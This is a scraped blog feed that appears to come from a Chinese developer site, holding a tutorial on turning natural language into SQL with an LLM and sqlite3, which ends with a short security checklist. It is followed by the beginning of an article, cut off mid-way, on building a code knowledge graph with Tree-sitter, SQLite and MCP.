a:after{content:"";display:inline-block;width:18px;height:18px;margin-left:4px;vertical-align:middle;background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMiIgaGVpZ2h0PSIyMiI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiBzdHJva2U9IiMwMjdGRkYiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCI+PHBhdGggZD0iTTkuODE1IDYuNDQ4bDEuOTM2LTEuOTM2YzEuMzM3LTEuMzM2IDMuNTgtMS4yNTkgNS4wMTMuMTczIDEuNDMyIDEuNDMyIDEuNTEgMy42NzYuMTczIDUuMDEzbC0xLjQ1MiAxLjQ1Mi0uOTY4Ljk2OGMtMS4zMzcgMS4zMzYtMy41ODEgMS4yNTktNS4wMTMtLjE3MyIvPjxwYXRoIGQ9Ik0xMS4yNjcgMTUuMzY3bC0xLjkzNiAxLjkzNmMtMS4zMzYgMS4zMzctMy41OCAxLjI2LTUuMDEyLS4xNzMtMS40MzItMS40MzItMS41MS0zLjY3Ni0uMTczLTUuMDEybDEuNDUyLTEuNDUyLjk2OC0uOTY4YzEuMzM2LTEuMzM3IDMuNTgtMS4yNiA1LjAxMi4xNzMiLz48L2c+PC9zdmc+);background-size:cover;background-repeat:no-repeat}.markdown-body a:hover{border-color:#027fff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body a.footnote-backref:after,.markdown-body a.footnote-ref:after,.markdown-body sup a:after{display:none!important}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border:2px solid #c6c6c6}.markdown-body table img{box-shadow:none!important}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body del{color:rgba(0,0,0,.6)}.markdown-body blockquote{position:relative;color:#666;padding:5px 23px 1px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:hsla(0,0%,78.4%,.12);transition:all .2s ease-in-out}.markdown-body blockquote:hover{border-color:#1976d2}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;font-size:24px;font-weight:800;line-height:24px;color:#cbcbcb;opacity:.6}.markdown-body blockquote:before{content:"“";top:4px;left:6px}.markdown-body blockquote:after{content:"”";right:8px;bottom:-8px}.markdown-body blockquote&gt;p,.markdown-body blockquote blockquote{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body details{outline:none;border:none;border-left:4px solid #1976d2;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary:hover::-webkit-details-marker{color:#1976d2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>自然语言生成 SQL，就像恋人读懂你没说出口的需要。</strong><br/>
而今天，我们要从一行行真实的 Python 代码出发，看看这份“默契”是如何被构建出来的。</p>
</blockquote>
<h2 data-id="heading-0">🧠 背后的主角：一个会写 SQL 的 AI 助手</h2>
<p>在你的笔记本中，核心逻辑其实非常清晰——<br/>
<strong>用大模型（如 DeepSeek）将用户的自然语言问题，转化为可执行的 SQL 语句</strong>。</p>
<p>整个流程分为四步：</p>
<ol>
<li><strong>连接数据库，建表</strong></li>
<li><strong>提取表结构（Schema）作为上下文</strong></li>
<li><strong>构造 Prompt，调用 LLM</strong></li>
<li><strong>执行生成的 SQL，返回结果</strong></li>
</ol>
<p>这看似简单，却蕴含了现代 AI 应用的关键思想：<strong>上下文驱动 + 精准约束 + 安全执行</strong>。</p>
<h2 data-id="heading-1">🔌 第一步：轻量级数据库，快速验证想法</h2>
<p>你使用了 Python 内置的 <code>sqlite3</code> 模块，创建了一张员工表：</p>
<pre><code class="hljs language-python" lang="python">cursor.execute(<span class="hljs-string">"""
CREATE TABLE IF NOT EXISTS employees(
 id INTEGER PRIMARY KEY,
 name TEXT,
 department TEXT,
 salary INTEGER
)
"""</span>)
</code></pre>
<p>接着插入几条示例数据（虽然因主键冲突报错，但无伤大雅）：</p>
<pre><code class="hljs language-scss" lang="scss">sample_data = <span class="hljs-selector-attr">[ (6, <span class="hljs-string">"黄佳"</span>, <span class="hljs-string">"销售"</span>, 50000), (7, <span class="hljs-string">"宁宁"</span>, <span class="hljs-string">"工程"</span>, 75000), (8, <span class="hljs-string">"谦谦"</span>, <span class="hljs-string">"销售"</span>, 60000), (9, <span class="hljs-string">"悦悦"</span>, <span class="hljs-string">"工程"</span>, 80000), (10, <span class="hljs-string">"黄仁勋"</span>, <span class="hljs-string">"市场"</span>, 55000), (11, <span class="hljs-string">"杜经理"</span>, <span class="hljs-string">"工程"</span>, 80000)]</span>
<span class="hljs-attribute">cursor</span><span class="hljs-selector-class">.executemany</span>("INSERT INTO employees VALUES(?,?,?,?)", sample_data)
</code></pre>
<blockquote>
<p>💡 这体现了快速原型开发的精髓：<strong>用最轻量的方式验证核心逻辑</strong>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">🗺️ 第二步：把“地图”交给 AI —— Schema 是关键！</h2>
<p>真正让 LLM 不瞎猜的，是你主动提供的 <strong>表结构信息</strong>：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">schema</span> = cursor.execute(<span class="hljs-string">"PRAGMA table_info(employees)"</span>).fetchall()
<span class="hljs-attr">schema_str</span> = <span class="hljs-string">"CREATE TABLE EMPLOYEES (\n"</span> + <span class="hljs-string">"\n"</span>.join([f<span class="hljs-string">"{col[1]} {col[2]}"</span> for col in schema]) + <span class="hljs-string">"\n)"</span>
</code></pre>
<p>输出结果为：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> EMPLOYEES (
id <span class="hljs-type">INTEGER</span>
name TEXT
department TEXT
salary <span class="hljs-type">INTEGER</span>
)
</code></pre>
<p>这一步至关重要！<br/>
没有 Schema，LLM 只能靠猜字段名（比如会不会叫 <code>dept</code> 而不是 <code>department</code>？），极易出错。<br/>
而有了它，AI 就像拿到了一张<strong>精准的数据地图</strong>，知道哪里是“姓名”，哪里是“部门”。</p>
<blockquote>
<p>✅ <strong>经验总结</strong>：Text-to-SQL 成功率 80% 取决于 Schema 提供是否完整清晰。</p>
</blockquote>
<h2 data-id="heading-3">💌 第三步：构造 Prompt —— 教 AI “好好说话”</h2>
<p>你设计的提示词非常克制而有效：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">prompt</span> = f<span class="hljs-string">"""
这是一个数据库的Schema:
{schema}
根据这个schema,请输出一个SQL查询，来回答以下问题：
只输出SQL查询语句本身，不要使用任何markdown格式，不要包含反引号、代码块标记或额外说明。
问题：{query}
"""</span>
</code></pre>
<p>并设置：</p>
<ul>
<li><code>temperature=0</code> → 确保输出确定、稳定</li>
<li><code>max_tokens=2048</code> → 防止截断</li>
<li><strong>明确禁止多余内容</strong> → 避免返回解释、注释或 Markdown</li>
</ul>
<p>为什么这么严格？<br/>
因为后续你要直接 <code>cursor.execute(sql)</code> ——<br/>
如果 AI 返回的是：</p>
<blockquote>
<p>“好的！以下是查询语句：\n<code>sql\nSELECT ...\n</code>”</p>
</blockquote>
<p>那程序就会崩溃！</p>
<blockquote>
<p>✅ <strong>最佳实践</strong>：对 LLM 的输出做<strong>格式强约束</strong>，是生产落地的前提。</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">🎯 实战演示：从“人话”到“机器语”</h2>
<h3 data-id="heading-5">场景一：查询</h3>
<blockquote>
<p>用户问：“工程部门员工的姓名和工资是多少？”</p>
</blockquote>
<p>AI 输出：</p>
<pre><code class="hljs language-ini" lang="ini">SELECT name, salary FROM EMPLOYEES WHERE <span class="hljs-attr">department</span> = <span class="hljs-string">'工程'</span><span class="hljs-comment">;</span>
</code></pre>
<p>执行结果：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[(<span class="hljs-string">'宁宁'</span>, 75000), (<span class="hljs-string">'悦悦'</span>, 80000), (<span class="hljs-string">'杜经理'</span>, 80000)]</span>
</code></pre>
<p>✅ 完美匹配中文语义，且字段、表名大小写一致（注意你用了 <code>EMPLOYEES</code> 全大写，SQLite 不敏感，但好习惯值得保持）。</p>
<hr/>
<h3 data-id="heading-6">场景二：插入</h3>
<blockquote>
<p>用户说：“在销售部门增加一个新员工，姓名为张三，工资为45000”</p>
</blockquote>
<p>AI 输出：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> EMPLOYEES (name, department, salary) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'张三'</span>, <span class="hljs-string">'销售'</span>, <span class="hljs-number">45000</span>);
</code></pre>
<p>注意：<strong>它自动省略了 <code>id</code> 字段</strong>！<br/>
因为你在建表时设了 <code>id INTEGER PRIMARY KEY</code>，SQLite 会自动递增。<br/>
这说明 LLM <strong>理解主键自增语义</strong>，非常聪明。</p>
<hr/>
<h3 data-id="heading-7">场景三：删除</h3>
<blockquote>
<p>用户指令：“删除市场部门的黄仁勋”</p>
</blockquote>
<p>AI 输出：</p>
<pre><code class="hljs language-ini" lang="ini">DELETE FROM EMPLOYEES WHERE <span class="hljs-attr">department</span> = <span class="hljs-string">'市场'</span> AND name = <span class="hljs-string">'黄仁勋'</span><span class="hljs-comment">;</span>
</code></pre>
<p>✅ 条件完整，避免误删。<br/>
但如果用户说“删掉黄仁勋”，没提部门，就可能误删重名者——<br/>
这提醒我们：<strong>业务语义需足够明确，或系统应主动澄清</strong>。</p>
<hr/>
<h2 data-id="heading-8">⚠️ 安全反思：不能盲目信任生成结果</h2>
<p>尽管 Demo 很美好，但真实场景必须考虑：</p>

























<table><thead><tr><th>风险</th><th>你的代码现状</th><th>建议改进</th></tr></thead><tbody><tr><td>执行任意 SQL</td><td>直接 <code>cursor.execute(sql_query)</code></td><td>加入 SQL 白名单（如只允许 <code>SELECT</code>）</td></tr><tr><td>表名/字段注入</td><td>依赖 LLM 输出</td><td>用正则校验是否只含字母、数字、下划线</td></tr><tr><td>无 WHERE 删除</td><td>当前示例有 WHERE</td><td>强制校验 <code>DELETE/UPDATE</code> 必须带条件</td></tr></tbody></table>
<blockquote>
<p>🔒 <strong>记住</strong>：Demo 可以浪漫，生产必须严谨。</p>
</blockquote>
<hr/>
<h2 data-id="heading-9">🌱 延伸思考：如何融入 MVC 架构？</h2>
<p>正如理念所倡导的 <strong>AI First + Mobile First + MVC</strong>，你可以这样扩展：</p>
<ul>
<li><strong>Model</strong>：封装数据库操作，提供 <code>query_by_natural_language(text)</code> 方法</li>
<li><strong>View</strong>：移动端聊天界面，输入框 + 结果卡片</li>
<li><strong>Controller</strong>：接收用户消息 → 调用 AI 生成 SQL → 执行 → 返回结构化数据</li>
</ul>
<p>未来甚至可加入：</p>
<ul>
<li>多轮对话（“刚才那个工程部的人，再查下他的入职时间”）</li>
<li>权限控制（销售只能查销售部数据）</li>
<li>自然语言转可视化图表（“画个柱状图”）</li>
</ul>
<hr/>
<h2 data-id="heading-10">✨ 结语：技术的温度，在于“理解”而非“执行”</h2>
<p>回到开头那句话：</p>
<blockquote>
<p>你说“我想知道上个月谁最常买我们的花。”<br/>
TA 默默写下 SQL，为你打捞答案。</p>
</blockquote>
<p>而在这份代码中，我们看到的不仅是 <code>OpenAI</code> 客户端、<code>sqlite3</code> 游标、<code>executemany</code>，<br/>
更是一种<strong>以人为本的设计哲学</strong>：</p>
<ul>
<li>给 AI 足够上下文（Schema）</li>
<li>约束输出格式（纯 SQL）</li>
<li>安全执行结果（commit / fetchall）</li>
</ul>
<p><strong>真正的智能，不是炫技，而是让非技术人员也能平等地使用数据。</strong></p>
<p>而这，或许就是下一代应用的起点。</p>
<hr/>
<p>📬 <strong>现在，轮到你了</strong>：<br/>
试着改写 <code>ask_deepseek</code> 函数，让它支持多表关联，或者自动处理日期范围（如“上个月” → <code>BETWEEN '2025-11-01' AND '2025-11-30'</code>）。<br/>
你会发现，<strong>AI 是笔，你是诗人</strong>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[构建企业级代码知识图谱系统：从理论到实践]]></title>    <link>https://juejin.cn/post/7579659550863114282</link>    <guid>https://juejin.cn/post/7579659550863114282</guid>    <pubDate>2025-12-04T16:36:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579659550863114282" data-draft-id="7579846685070966838" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="构建企业级代码知识图谱系统：从理论到实践"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-12-04T16:36:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="www769"/> <meta itemprop="url" content="https://juejin.cn/user/1656332880187112"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            构建企业级代码知识图谱系统：从理论到实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1656332880187112/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    www769
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T16:36:17.000Z" title="Thu Dec 04 2025 16:36:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在现代软件开发中，代码库的复杂性与日俱增。传统的静态分析工具虽然能够提供基本的代码关系信息，但往往缺乏深层次的语义理解和上下文关联。随着AI辅助编程的普及，我们迫切需要一套能够为AI模型提供结构化代码知识的系统。</p>
<p>我们开发了Legacy Code Archaeologist——一个基于知识图谱的代码分析平台。本文将毫无保留地分享这套系统的完整构建过程，包括踩过的坑和积累的经验。</p>
<h2 data-id="heading-1">系统架构设计</h2>
<h3 data-id="heading-2">整体架构概览</h3>
<p>构建代码知识图谱系统的核心挑战在于如何将非结构化的代码转换为结构化的关系数据，并以高效的方式为AI模型提供服务。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "输入层"
        A[源代码文件] --&gt; B[文件监听器]
        B --&gt; C[增量检测]
    end
    
    subgraph "解析层"
        C --&gt; D[Tree-sitter解析器]
        D --&gt; E[语法树生成]
        E --&gt; F[符号表构建]
        F --&gt; G[关系提取器]
    end
    
    subgraph "存储层"
        G --&gt; H[图数据库]
        H --&gt; I[关系索引]
        I --&gt; J[缓存层]
    end
    
    subgraph "服务层"
        J --&gt; K[MCP协议层]
        K --&gt; L[RESTful API]
        L --&gt; M[WebSocket实时推送]
    end
    
    subgraph "应用层"
        M --&gt; N[AI助手集成]
        M --&gt; O[可视化界面]
        M --&gt; P[IDE插件]
    end
</code></pre>
<h3 data-id="heading-3">技术选型考量</h3>
<p>在系统设计初期，我们面临多个技术选型决策。这里分享几个关键的权衡：</p>
<h4 data-id="heading-4">解析器选择：Tree-sitter vs ANTLR</h4>



































<table><thead><tr><th>特性</th><th>Tree-sitter</th><th>ANTLR</th></tr></thead><tbody><tr><td>解析速度</td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐</td></tr><tr><td>容错能力</td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐</td></tr><tr><td>语言支持</td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td></tr><tr><td>增量解析</td><td>⭐⭐⭐⭐⭐</td><td>⭐</td></tr><tr><td>社区支持</td><td>⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td></tr></tbody></table>
<p>最终选择Tree-sitter的原因：</p>
<ol>
<li><strong>增量解析能力</strong>：对于实时系统至关重要</li>
<li><strong>错误恢复机制</strong>：能够处理不完整或语法错误的代码</li>
<li><strong>统一接口</strong>：所有语言使用相同的查询语法</li>
</ol>
<h4 data-id="heading-5">存储方案：图数据库 vs 关系数据库</h4>
<p>经过性能测试，我们发现对于代码关系查询场景，SQLite配合适当的索引设计反而比Neo4j等专业图数据库性能更好：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    subgraph "关系型存储设计"
        A[nodes表] --&gt; B[qualified_name索引]
        A --&gt; C[type索引]
        D[edges表] --&gt; E[src_id + dst_id复合索引]
        D --&gt; F[relation_type索引]
        A --&gt; D
    end
</code></pre>
<p>这种设计的优势：</p>
<ul>
<li><strong>部署简单</strong>：无需额外的图数据库服务</li>
<li><strong>查询灵活</strong>：SQL比Cypher更通用</li>
<li><strong>性能可控</strong>：索引策略完全可控</li>
</ul>
<h2 data-id="heading-6">核心组件实现</h2>
<h3 data-id="heading-7">代码解析引擎</h3>
<p>代码解析是整个系统的基础，需要从源代码中准确提取出实体和关系。以Python代码为例：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[Python源文件] --&gt; B[Tree-sitter解析]
    B --&gt; C[AST遍历]
    C --&gt; D[实体识别]
    C --&gt; E[关系提取]
    
    subgraph "实体类型"
        F[类定义]
        G[函数定义]
        H[变量定义]
        I[导入语句]
    end
    
    subgraph "关系类型"
        J[继承关系]
        K[调用关系]
        L[依赖关系]
        M[数据流关系]
    end
    
    D --&gt; F
    D --&gt; G  
    D --&gt; H
    D --&gt; I
    
    E --&gt; J
    E --&gt; K
    E --&gt; L
    E --&gt; M
</code></pre>
<p>关键的实现细节包括：</p>
<ol>
<li><strong>作用域解析</strong>：正确处理变量的作用域，避免命名冲突</li>
<li><strong>类型推导</strong>：基于赋值和函数签名推导变量类型</li>
<li><strong>跨文件引用</strong>：解析import语句，建立模块间的依赖关系</li>
</ol>
<h3 data-id="heading-8">增量更新机制</h3>
<p>对于大型代码库，全量重新解析是不现实的。我们设计了一套增量更新机制：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant FS as 文件系统监听
    participant IU as 增量更新器
    participant Parser as 解析器
    participant Graph as 图存储
    participant Event as 事件总线

    FS-&gt;&gt;IU: 文件变更事件
    IU-&gt;&gt;IU: 计算影响范围
    IU-&gt;&gt;Graph: 删除旧关系
    IU-&gt;&gt;Parser: 解析变更文件
    Parser-&gt;&gt;Graph: 插入新关系
    Graph-&gt;&gt;Event: 广播更新事件
    Event-&gt;&gt;Client: 推送给前端
</code></pre>
<p>增量更新的核心算法：</p>
<ol>
<li><strong>依赖分析</strong>：构建文件间的依赖图</li>
<li><strong>影响范围计算</strong>：找出需要重新解析的文件集合</li>
<li><strong>关系清理</strong>：删除过时的关系记录</li>
<li><strong>选择性重建</strong>：只重新构建受影响的部分</li>
</ol>
<h3 data-id="heading-9">MCP协议集成</h3>
<p>Model Context Protocol (MCP)是我们与AI模型通信的桥梁。协议栈的设计如下：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "MCP协议栈"
        A[HTTP/SSE传输层] --&gt; B[JSON-RPC消息层]
        B --&gt; C[工具调用层]
        C --&gt; D[资源访问层]
    end
    
    subgraph "工具类型"
        E[scan_full - 全量扫描]
        F[scan_incremental - 增量扫描] 
        G[analyze_relationships - 关系分析]
    end
    
    subgraph "资源类型"
        H[graph/stats - 统计信息]
        I[graph/nodes - 节点详情]
        J[graph/edges - 关系列表]
    end
    
    C --&gt; E
    C --&gt; F
    C --&gt; G
    
    D --&gt; H
    D --&gt; I  
    D --&gt; J
</code></pre>
<h2 data-id="heading-10">性能优化实践</h2>
<h3 data-id="heading-11">查询优化策略</h3>
<p>在实际生产环境中，我们发现查询性能是系统可用性的关键。以下是几个重要的优化策略：</p>
<h4 data-id="heading-12">1. 索引设计</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 核心索引设计</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_nodes_qualified_name <span class="hljs-keyword">ON</span> nodes(qualified_name);
<span class="hljs-keyword">CREATE</span> INDEX idx_nodes_type <span class="hljs-keyword">ON</span> nodes(type);
<span class="hljs-keyword">CREATE</span> INDEX idx_edges_src_dst <span class="hljs-keyword">ON</span> edges(src_id, dst_id);
<span class="hljs-keyword">CREATE</span> INDEX idx_edges_relation <span class="hljs-keyword">ON</span> edges(relation_type);

<span class="hljs-comment">-- 复合查询优化</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_edges_complex <span class="hljs-keyword">ON</span> edges(src_id, relation_type, dst_id);
</code></pre>
<h4 data-id="heading-13">2. 缓存策略</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[查询请求] --&gt; B{缓存检查}
    B --&gt;|命中| C[返回缓存结果]
    B --&gt;|未命中| D[数据库查询]
    D --&gt; E[更新缓存]
    E --&gt; F[返回结果]
    
    subgraph "缓存层级"
        G[内存缓存 - 热点数据]
        H[Redis缓存 - 会话数据]
        I[本地文件缓存 - 图数据]
    end
</code></pre>
<h4 data-id="heading-14">3. 批处理优化</h4>
<p>对于大型项目的扫描，我们采用批处理策略：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">batch_process_files</span>(<span class="hljs-params">file_paths: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>], batch_size: <span class="hljs-built_in">int</span> = <span class="hljs-number">50</span></span>):
    <span class="hljs-string">"""批量处理文件，避免内存溢出"""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(file_paths), batch_size):
        batch = file_paths[i:i + batch_size]
        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> asyncio.TaskGroup() <span class="hljs-keyword">as</span> tg:
            tasks = [tg.create_task(parse_file(fp)) <span class="hljs-keyword">for</span> fp <span class="hljs-keyword">in</span> batch]
        
        <span class="hljs-comment"># 每个批次后进行垃圾回收</span>
        gc.collect()
</code></pre>
<h3 data-id="heading-15">内存管理</h3>
<p>大型代码库分析时，内存使用是一个挑战：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[内存使用监控] --&gt; B{内存使用率检查}
    B --&gt;|&gt; 80%| C[触发垃圾回收]
    B --&gt;|&gt; 90%| D[暂停解析]
    C --&gt; E[释放缓存]
